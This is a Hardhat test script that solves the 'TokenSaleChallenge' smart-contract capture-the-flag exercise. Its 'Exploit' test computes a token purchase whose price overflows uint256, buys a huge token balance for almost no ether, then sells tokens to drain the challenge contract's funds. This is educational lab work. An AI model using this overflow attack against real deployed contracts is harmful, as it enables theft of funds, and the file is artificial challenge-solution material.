const { expect } = require("chai");
const { ethers } = require("hardhat");

describe.only("TokenSaleChallenge", async function () {
    let contract;
    let player;

    const ETHER = ethers.utils.parseEther("1");
    const MAX_UINT256 = ethers.BigNumber.from(2).pow(256).sub(1);

    before(async function () {
        player = await ethers.getSigner();
        contract = await (await ethers.getContractFactory("TokenSaleChallenge")).deploy(player.address, { value: ethers.utils.parseEther("1") });
    });

    it("Exploit", async function () {
        // WRITE YOUR CODE HERE
        const numTokens = MAX_UINT256.div(ETHER).add(1);
        const overflow = numTokens.mul(ETHER).sub(MAX_UINT256).sub(1);

        await contract.buy(numTokens, { value: overflow });
        expect(await contract.balanceOf(player.address)).to.equal(numTokens);

        await contract.sell((await ethers.provider.getBalance(contract.address)).div(ETHER));
    });

    after(async function () {
        expect(await contract.isComplete()).to.be.true;
    });
});